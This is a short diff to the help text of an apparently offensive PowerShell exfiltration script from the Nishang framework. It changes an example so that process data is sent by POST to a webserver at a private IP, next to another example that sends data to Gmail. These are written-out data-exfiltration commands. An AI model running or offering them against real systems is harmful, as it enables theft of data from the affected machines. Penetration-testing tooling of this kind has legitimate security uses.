@@ -45,7 +45,7 @@ PS > Get-Information | Do-Exfiltration -ExfilOption gmail -username <> -Password
 Use above command for data exfiltration to gmail
 
 .EXAMPLE
-PS > Get-Information | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+PS > Do-Exfiltration -Data (Get-Process) -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
 
 Use above command for data exfiltration to a webserver which logs POST requests.
 
@@ -95,6 +95,7 @@ https://github.com/samratashok/nishang
         [String]
         $AuthNS
     )
+
 
     function post_http($url,$parameters) 
     { 
